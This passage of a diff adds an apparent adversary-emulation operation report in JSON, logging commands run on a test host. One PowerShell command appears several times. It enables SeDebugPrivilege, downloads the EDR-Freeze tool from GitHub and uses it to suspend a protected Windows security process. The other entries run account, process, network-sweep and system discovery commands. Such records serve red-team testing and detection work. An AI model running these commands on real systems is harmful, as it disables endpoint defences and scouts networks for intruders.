-ErrorAction SilentlyContinue |;     Sort-Object LastWriteTime -Descending |;     Select-Object -First 1 -ExpandProperty Name; if (-not $edrFreezeExeName) {;     Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red;     exit 1; }; $edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName; Write-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan; Write-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow; Start-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null",
+        "plaintext_command": "Add-Type -TypeDefinition @\"; using System; using System.Runtime.InteropServices; public class TokenAdjuster {;     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,;         ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);     [StructLayout(LayoutKind.Sequential, Pack = 1)];     public struct TOKEN_PRIVILEGES {;         public int PrivilegeCount;         public long Luid;         public int Attributes;     };     public const int SE_PRIVILEGE_ENABLED = 0x00000002;     public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;     public const uint TOKEN_QUERY = 0x0008;     public static bool EnableSeDebugPrivilege() {;         IntPtr hToken;         if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken));             return false;         long luid;         if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid));             return false;         TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();         tp.PrivilegeCount = 1;         tp.Luid = luid;         tp.Attributes = SE_PRIVILEGE_ENABLED;         return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);     }; }; \"@; $result = [TokenAdjuster]::EnableSeDebugPrivilege(); if ($result) {;     Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green; } else {;     Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red;     exit 1; }; $process = Get-Process -Name $SecurityHealthService -ErrorAction Stop; $processName = $process.ProcessName; Write-Host \"Process Name: $processName)\"; Write-Host \"PID: $($process.Id)\";         ; $query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"; $wmiProcess = Get-WmiObject -Query $query; $owner = $wmiProcess.GetOwner();     Write-Host \"User: $($owner.Domain)\\$($owner.User)\"; $scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition; $downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"; $zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"; Write-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan; try {;     Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop;     Write-Host \"Download completed: $zipPath\" -ForegroundColor Green;     $extractFolder = $scriptFolder;     if (Test-Path $zipPath) {;         Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan;         if (Test-Path $extractFolder) {;             Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;         };         Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null;         $archive = $null;         try {;             $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath);             foreach ($entry in $archive.Entries) {;                 if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue };                 if ($entry.FullName.EndsWith('/')) {;                     $dirPath = Join-Path $extractFolder $entry.FullName;                     if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null };                     continue;                 };                 $destPath = Join-Path $extractFolder $entry.FullName;                 $destDir = Split-Path $destPath -Parent;                 if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null };                 if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue };                 try {;                     [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false);                 } catch {;                     Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow;                 };             };             Write-Host \"Extraction completed.\" -ForegroundColor Green;         } finally {;             if ($archive) { $archive.Dispose() };         };     }; } catch {;     Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red; }; Write-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 3; Write-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 2; $edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |;     Sort-Object LastWriteTime -Descending |;     Select-Object -First 1 -ExpandProperty Name; if (-not $edrFreezeExeName) {;     Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red;     exit 1; }; $edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName; Write-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan; Write-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow; Start-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null",
+        "status": 1,
+        "score": 0,
+        "decide": "2026-04-01T13:47:24Z",
+        "pin": 0,
+        "pid": "4296",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "0d02e948-0045-4a9b-a2e0-b8e17a007065",
+        "collect": "2026-04-01T13:48:21Z",
+        "finish": "2026-04-01T13:48:22Z",
+        "ability": {
+          "ability_id": "54ebf8b23105d20c98156afd96b97c81",
+          "tactic": "defense-evasion",
+          "technique_name": "Impair Defenses: Disable or Modify Tools",
+          "technique_id": "T1562.001",
+          "name": "Freeze PPL-protected process with EDR-Freeze",
+          "description": "This test utilizes the tool EDR-Freeze, which leverages the native Microsoft binary WerFaultSecure.exe to suspend processes protected by the Protected Process Light mechanism. PPL is a Windows security feature designed to safeguard critical system processes — such as those related to antivirus, credential protection, and system integrity — from tampering or inspection. These processes operate in a restricted environment that prevents access even from administrators or debugging tools, unless the accessing tool is signed and trusted by Microsoft. By using WerFaultSecure.exe, which is inherently trusted by the operating system, EDR-Freeze is able to bypass these restrictions and temporarily freeze PPL-protected processes for analysis or testing purposes.",
+          "executors": [
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "Add-Type -TypeDefinition @\"; using System; using System.Runtime.InteropServices; public class TokenAdjuster {;     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,;         ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);     [StructLayout(LayoutKind.Sequential, Pack = 1)];     public struct TOKEN_PRIVILEGES {;         public int PrivilegeCount;         public long Luid;         public int Attributes;     };     public const int SE_PRIVILEGE_ENABLED = 0x00000002;     public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;     public const uint TOKEN_QUERY = 0x0008;     public static bool EnableSeDebugPrivilege() {;         IntPtr hToken;         if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken));             return false;         long luid;         if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid));             return false;         TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();         tp.PrivilegeCount = 1;         tp.Luid = luid;         tp.Attributes = SE_PRIVILEGE_ENABLED;         return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);     }; }; \"@; $result = [TokenAdjuster]::EnableSeDebugPrivilege(); if ($result) {;     Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green; } else {;     Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red;     exit 1; }; $process = Get-Process -Name $SecurityHealthService -ErrorAction Stop; $processName = $process.ProcessName; Write-Host \"Process Name: $processName)\"; Write-Host \"PID: $($process.Id)\";         ; $query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"; $wmiProcess = Get-WmiObject -Query $query; $owner = $wmiProcess.GetOwner();     Write-Host \"User: $($owner.Domain)\\$($owner.User)\"; $scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition; $downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"; $zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"; Write-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan; try {;     Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop;     Write-Host \"Download completed: $zipPath\" -ForegroundColor Green;     $extractFolder = $scriptFolder;     if (Test-Path $zipPath) {;         Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan;         if (Test-Path $extractFolder) {;             Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;         };         Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null;         $archive = $null;         try {;             $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath);             foreach ($entry in $archive.Entries) {;                 if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue };                 if ($entry.FullName.EndsWith('/')) {;                     $dirPath = Join-Path $extractFolder $entry.FullName;                     if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null };                     continue;                 };                 $destPath = Join-Path $extractFolder $entry.FullName;                 $destDir = Split-Path $destPath -Parent;                 if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null };                 if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue };                 try {;                     [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false);                 } catch {;                     Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow;                 };             };             Write-Host \"Extraction completed.\" -ForegroundColor Green;         } finally {;             if ($archive) { $archive.Dispose() };         };     }; } catch {;     Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red; }; Write-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 3; Write-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 2; $edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |;     Sort-Object LastWriteTime -Descending |;     Select-Object -First 1 -ExpandProperty Name; if (-not $edrFreezeExeName) {;     Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red;     exit 1; }; $edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName; Write-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan; Write-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow; Start-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [
+                {
+                  "module": "plugins.atomic.app.parsers.atomic_powershell",
+                  "parserconfigs": [
+                    {
+                      "source": "validate_me",
+                      "edge": "",
+                      "target": "",
+                      "custom_parser_vals": {}
+                    }
+                  ]
+                }
+              ],
+              "cleanup": [
+                "Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue; Write-Output \"File deleted: $edrFreezeExe\""
+              ],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "defense-evasion"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "atomic",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "Add-Type -TypeDefinition @\"; using System; using System.Runtime.InteropServices; public class TokenAdjuster {;     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,;         ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);     [StructLayout(LayoutKind.Sequential, Pack = 1)];     public struct TOKEN_PRIVILEGES {;         public int PrivilegeCount;         public long Luid;         public int Attributes;     };     public const int SE_PRIVILEGE_ENABLED = 0x00000002;     public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;     public const uint TOKEN_QUERY = 0x0008;     public static bool EnableSeDebugPrivilege() {;         IntPtr hToken;         if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken));             return false;         long luid;         if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid));             return false;         TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();         tp.PrivilegeCount = 1;         tp.Luid = luid;         tp.Attributes = SE_PRIVILEGE_ENABLED;         return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);     }; }; \"@; $result = [TokenAdjuster]::EnableSeDebugPrivilege(); if ($result) {;     Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green; } else {;     Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red;     exit 1; }; $process = Get-Process -Name $SecurityHealthService -ErrorAction Stop; $processName = $process.ProcessName; Write-Host \"Process Name: $processName)\"; Write-Host \"PID: $($process.Id)\";         ; $query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"; $wmiProcess = Get-WmiObject -Query $query; $owner = $wmiProcess.GetOwner();     Write-Host \"User: $($owner.Domain)\\$($owner.User)\"; $scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition; $downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"; $zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"; Write-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan; try {;     Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop;     Write-Host \"Download completed: $zipPath\" -ForegroundColor Green;     $extractFolder = $scriptFolder;     if (Test-Path $zipPath) {;         Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan;         if (Test-Path $extractFolder) {;             Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;         };         Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null;         $archive = $null;         try {;             $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath);             foreach ($entry in $archive.Entries) {;                 if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue };                 if ($entry.FullName.EndsWith('/')) {;                     $dirPath = Join-Path $extractFolder $entry.FullName;                     if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null };                     continue;                 };                 $destPath = Join-Path $extractFolder $entry.FullName;                 $destDir = Split-Path $destPath -Parent;                 if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null };                 if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue };                 try {;                     [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false);                 } catch {;                     Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow;                 };             };             Write-Host \"Extraction completed.\" -ForegroundColor Green;         } finally {;             if ($archive) { $archive.Dispose() };         };     }; } catch {;     Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red; }; Write-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 3; Write-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 2; $edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |;     Sort-Object LastWriteTime -Descending |;     Select-Object -First 1 -ExpandProperty Name; if (-not $edrFreezeExeName) {;     Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red;     exit 1; }; $edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName; Write-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan; Write-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow; Start-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [
+            {
+              "module": "plugins.atomic.app.parsers.atomic_powershell",
+              "parserconfigs": [
+                {
+                  "source": "validate_me",
+                  "edge": "",
+                  "target": "",
+                  "custom_parser_vals": {}
+                }
+              ]
+            }
+          ],
+          "cleanup": [
+            "Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue; Write-Output \"File deleted: $edrFreezeExe\""
+          ],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "True",
+        "deadman": false,
+        "agent_reported_time": "2026-04-01T13:48:22Z"
+      },
+      {
+        "id": "af7bf1e6-6b76-4b72-89f5-046815b5284d",
+        "paw": "fgdafj",
+        "command": "Get-WmiObject -Class Win32_UserAccount",
+        "plaintext_command": "Get-WmiObject -Class Win32_UserAccount",
+        "status": 0,
+        "score": 0,
+        "decide": "2026-04-01T13:48:25Z",
+        "pin": 0,
+        "pid": "7648",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "af7bf1e6-6b76-4b72-89f5-046815b5284d",
+        "collect": "2026-04-01T13:49:14Z",
+        "finish": "2026-04-01T13:49:14Z",
+        "ability": {
+          "ability_id": "feaced8f-f43f-452a-9500-a5219488abb8",
+          "tactic": "discovery",
+          "technique_name": "Account Discovery: Local Account",
+          "technique_id": "T1087.001",
+          "name": "Identify local users",
+          "description": "Identify all local users",
+          "executors": [
+            {
+              "name": "sh",
+              "platform": "darwin",
+              "command": "dscl . list /Users | grep -v '_'",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            },
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "Get-WmiObject -Class Win32_UserAccount",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "discovery"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "stockpile",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "Get-WmiObject -Class Win32_UserAccount",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "True",
+        "deadman": false,
+        "agent_reported_time": "2026-04-01T13:49:14Z"
+      },
+      {
+        "id": "a18ccb62-dd9a-4cbd-8fa2-4226cd90855c",
+        "paw": "fgdafj",
+        "command": "get-wmiObject -class Win32_Process",
+        "plaintext_command": "get-wmiObject -class Win32_Process",
+        "status": 1,
+        "score": 0,
+        "decide": "2026-04-01T13:49:19Z",
+        "pin": 0,
+        "pid": "7380",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "a18ccb62-dd9a-4cbd-8fa2-4226cd90855c",
+        "collect": "2026-04-01T13:49:56Z",
+        "finish": "2026-04-01T13:49:59Z",
+        "ability": {
+          "ability_id": "1ddf2b8ee6a56ce9f9132a168947653e",
+          "tactic": "discovery",
+          "technique_name": "Process Discovery",
+          "technique_id": "T1057",
+          "name": "Process Discovery - get-wmiObject",
+          "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n",
+          "executors": [
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "get-wmiObject -class Win32_Process",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [
+                {
+                  "module": "plugins.atomic.app.parsers.atomic_powershell",
+                  "parserconfigs": [
+                    {
+                      "source": "validate_me",
+                      "edge": "",
+                      "target": "",
+                      "custom_parser_vals": {}
+                    }
+                  ]
+                }
+              ],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "discovery"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "atomic",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "get-wmiObject -class Win32_Process",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [
+            {
+              "module": "plugins.atomic.app.parsers.atomic_powershell",
+              "parserconfigs": [
+                {
+                  "source": "validate_me",
+                  "edge": "",
+                  "target": "",
+                  "custom_parser_vals": {}
+                }
+              ]
+            }
+          ],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "True",
+        "deadman": false,
+        "agent_reported_time": "2026-04-01T13:49:56Z"
+      },
+      {
+        "id": "df1d26c3-c085-4813-bb17-d920f9c573a3",
+        "paw": "fgdafj",
+        "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}",
+        "plaintext_command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}",
+        "status": 1,
+        "score": 0,
+        "decide": "2026-04-01T13:50:02Z",
+        "pin": 0,
+        "pid": "8116",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "df1d26c3-c085-4813-bb17-d920f9c573a3",
+        "collect": "2026-04-01T13:50:53Z",
+        "finish": "2026-04-01T13:51:06Z",
+        "ability": {
+          "ability_id": "13a0c78dbd8d3645db69540bfe7cd038",
+          "tactic": "discovery",
+          "technique_name": "Remote System Discovery",
+          "technique_id": "T1018",
+          "name": "Remote System Discovery - nslookup",
+          "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n",
+          "executors": [
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [
+                {
+                  "module": "plugins.atomic.app.parsers.atomic_powershell",
+                  "parserconfigs": [
+                    {
+                      "source": "validate_me",
+                      "edge": "",
+                      "target": "",
+                      "custom_parser_vals": {}
+                    }
+                  ]
+                }
+              ],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "discovery"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "atomic",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [
+            {
+              "module": "plugins.atomic.app.parsers.atomic_powershell",
+              "parserconfigs": [
+                {
+                  "source": "validate_me",
+                  "edge": "",
+                  "target": "",
+                  "custom_parser_vals": {}
+                }
+              ]
+            }
+          ],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "True",
+        "deadman": false,
+        "agent_reported_time": "2026-04-01T13:50:53Z"
+      },
+      {
+        "id": "4c394a86-3166-41e1-83c4-0efe8e65af3b",
+        "paw": "fgdafj",
+        "command": "wmic cpu get name && wmic MEMPHYSICAL get MaxCapacity && wmic baseboard get product && wmic baseboard get version && wmic bios get SMBIOSBIOSVersion && wmic path win32_VideoController get name && wmic path win32_VideoController get DriverVersion && wmic path win32_VideoController get VideoModeDescription && wmic OS get Caption,OSArchitecture,Version && wmic DISKDRIVE get Caption && Get-WmiObject win32_bios",
+        "plaintext_command": "wmic cpu get name && wmic MEMPHYSICAL get MaxCapacity && wmic baseboard get product && wmic baseboard get version && wmic bios get SMBIOSBIOSVersion && wmic path win32_VideoController get name && wmic path win32_VideoController get DriverVersion && wmic path win32_VideoController get VideoModeDescription && wmic OS get Caption,OSArchitecture,Version && wmic DISKDRIVE get Caption && Get-WmiObject win32_bios",
+        "status": 1,
+        "score": 0,
+        "decide": "2026-04-01T13:51:06Z",
+        "pin": 0,
+        "pid": "212",
+        "facts": [
+          {
+            "unique": "host.ip.address9.17.9.4",
+            "trait": "host.ip.address",
+            "name": "host.ip.address",
+            "value": "9.17.9.4",
+            "created": "2026-04-01T13:51:49Z",
+            "score": 1,
+            "source": "ca25eccc-1615-463f-92e7-c885e9915d59",
+            "origin_type": "LEARNED",
+            "links": [
+              "4c394a86-3166-41e1-83c4-0efe8e65af3b"
+            ],
+            "relationships": [],
+            "limit_count": -1,
+            "collected_by": [
+              "fgdafj"
+            ],
+            "technique_id": "T1082"
+          }
+        ],
+        "relationships": [],
+        "used": [],
+        "unique": "4c394a86-3166-41e1-83c4-0efe8e65af3b",
+        "collect": "2026-04-01T13:51:48Z",
+        "finish": "2026-04-01T13:51:49Z",
+        "ability": {
+          "ability_id": "7d0acfc367ef432554f480d6e8c22c7c",
+          "tactic": "discovery",
+          "technique_name": "System Information Discovery",
+          "technique_id": "T1082",
+          "name": "System Information Discovery with WMIC",
